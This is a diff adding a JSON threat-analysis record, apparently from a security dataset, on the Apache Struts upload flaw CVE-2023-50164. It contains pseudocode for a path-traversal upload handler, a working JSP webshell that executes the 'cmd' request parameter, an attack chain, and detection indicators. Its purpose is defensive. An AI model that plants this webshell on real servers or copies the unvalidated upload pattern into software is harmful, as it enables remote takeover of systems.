@@ -1,0 +1,97 @@
+{
+  "package_info": {
+    "package_name": "Apache Struts (affected versions)",
+    "package_manager": "Maven (Java ecosystem)",
+    "package_versions": "Struts 2.0.0 - 2.5.32, Struts 6.0.0 - 6.3.0.1",
+    "why_malicious": "The affected versions of Apache Struts contain a critical vulnerability (CVE-2023-50164) that allows attackers to manipulate file upload parameters, enabling path traversal and, under certain circumstances, the upload of malicious files (such as a WAR webshell). This can lead to remote code execution on the server, making the package as shipped in these versions dangerous and exploitable."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "At runtime, when a file upload request is processed by the application.",
+        "file_location": "Struts web application file upload handler (Java controller/action responsible for processing uploads).",
+        "required_permissions": [
+          "filesystem write access to the server's file system",
+          "network access (if the uploaded file is later used for remote access or exfiltration)"
+        ]
+      },
+      "code_snippet": "// Pseudocode representing the vulnerable file upload logic\nString uploadPath = request.getParameter(\"uploadPath\");\nFile uploadedFile = new File(uploadPath, uploadedFileName);\nfileItem.write(uploadedFile);",
+      "code_language": "java",
+      "code_behavior": "At runtime, the file upload handler accepts user-supplied file path parameters, directly constructs a file path using this input, and writes the uploaded file to the resulting location, enabling attackers to perform path traversal and place arbitrary files (such as a WAR webshell) on the server, which can result in remote code execution.",
+      "malice_analysis": {
+        "why_suspicious": "The code directly uses user-supplied input to determine the file system path for uploaded files without any validation or sanitization, allowing attackers to traverse directories and write files outside the intended upload directory.",
+        "violated_expectations": "Normal file upload handlers should strictly validate and sanitize both file names and destination paths, ensuring that uploads are only written to safe, predetermined directories. This code fails to enforce such controls, enabling arbitrary file placement.",
+        "similar_legitimate_use": "Legitimate file upload features may allow users to upload files, but should never allow user control over the destination path or permit directory traversal sequences.",
+        "key_indicators": [
+          "Absence of path sanitization or validation on user-supplied input",
+          "Direct concatenation of user input into file system paths",
+          "Ability to write files to arbitrary locations, including application server deployment directories",
+          "Presence of directory traversal sequences (e.g., '../') in upload parameters"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "At runtime, after a malicious file (such as a WAR webshell) has been uploaded and deployed by the application server.",
+        "file_location": "Deployed webshell (uploaded WAR file containing a JSP file in the Tomcat webapps directory).",
+        "required_permissions": [
+          "filesystem write access (to deploy the webshell)",
+          "network access (to receive attacker commands and exfiltrate data)",
+          "process execution (to run system commands via the webshell)"
+        ]
+      },
+      "code_snippet": "// Example of a simple Java webshell (in a JSP file)\n<%\nif (request.getParameter(\"cmd\") != null) {\n    String cmd = request.getParameter(\"cmd\");\n    Process p = Runtime.getRuntime().exec(cmd);\n    java.io.InputStream in = p.getInputStream();\n    int a = -1;\n    while((a=in.read())!=-1) out.print((char)a);\n}\n%>",
+      "code_language": "java (JSP)",
+      "code_behavior": "At runtime, after the attacker uploads and deploys a malicious WAR file, the webshell receives HTTP requests containing a 'cmd' parameter, executes the specified system command on the server, and returns the command output in the HTTP response, resulting in remote code execution and full server compromise.",
+      "malice_analysis": {
+        "why_suspicious": "The webshell executes arbitrary system commands received via HTTP parameters and returns their output, providing attackers with persistent remote access and control over the server.",
+        "violated_expectations": "Normal web applications should never allow execution of system commands based on user input. This behavior is only present in malicious implants or backdoors.",
+        "similar_legitimate_use": "There is no legitimate use for this pattern in production web applications; command execution from HTTP parameters is a hallmark of webshells.",
+        "key_indicators": [
+          "Use of Runtime.getRuntime().exec() or similar APIs with user-supplied input",
+          "Returning system command output directly in HTTP responses",
+          "Presence of webshell code in newly uploaded or modified files",
+          "HTTP endpoints that accept and execute arbitrary commands via parameters (e.g., 'cmd=')"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker crafts a file upload request with a manipulated upload path parameter containing directory traversal sequences to perform path traversal.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Malicious file (such as a WAR webshell) is written to a location (e.g., Tomcat webapps directory) where it will be automatically deployed and executed by the application server."
+    },
+    {
+      "step": 2,
+      "action": "Attacker accesses the uploaded webshell via HTTP and sends commands to be executed on the server through the webshell interface.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Remote code execution and full compromise of the server, allowing the attacker to execute arbitrary commands and maintain persistent access."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "File uploads resulting in files being written outside the intended upload directory, especially into application server deployment paths (e.g., Tomcat webapps).",
+      "Unexpected deployment of new .war or .jsp files in Tomcat webapps directory following file upload activity.",
+      "HTTP requests to newly uploaded files with suspicious parameters (e.g., ?cmd=) that trigger command execution.",
+      "Execution of system commands via web application endpoints, observable through process creation logs or command output in HTTP responses."
+    ],
+    "file_indicators": [
+      "Unexpected .war or .jsp files appearing in Tomcat webapps directory, especially shortly after file uploads.",
+      "File names or paths containing directory traversal sequences (../) in upload requests or resulting file system changes.",
+      "Presence of webshell code patterns (e.g., Runtime.getRuntime().exec in JSP files) in newly created or modified files."
+    ],
+    "network_indicators": [
+      "Inbound HTTP requests to newly deployed files with suspicious parameters (e.g., ?cmd=) indicating webshell interaction.",
+      "Outbound connections initiated by the application server to external or attacker-controlled hosts, potentially for command and control or data exfiltration."
+    ],
+    "how_to_detect": "Monitor file upload endpoints for path traversal attempts by inspecting upload parameters for directory traversal sequences and ensuring uploaded files are only written to authorized directories. Audit the Tomcat webapps directory for unexpected .war or .jsp files, especially those created shortly after file uploads. Inspect HTTP access logs for requests to new files with command execution parameters (e.g., ?cmd=). Use file integrity monitoring to detect unauthorized file creation or modification. Alert on the use of Runtime.getRuntime().exec() or similar APIs in uploaded or recently modified files. Correlate file upload events with subsequent deployment of executable files and suspicious HTTP activity to identify exploitation attempts."
+  }
+}
